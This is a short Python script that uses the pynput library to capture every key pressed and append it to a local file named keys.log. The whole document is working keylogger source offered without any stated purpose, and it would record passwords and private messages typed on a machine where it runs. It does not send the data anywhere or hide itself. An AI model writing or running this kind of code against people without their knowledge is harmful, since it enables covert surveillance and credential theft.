from pynput import keyboard

def on_press(key):
    try:
        with open("keys.log", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keys.log", "a") as f:
            f.write(f"[{key}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
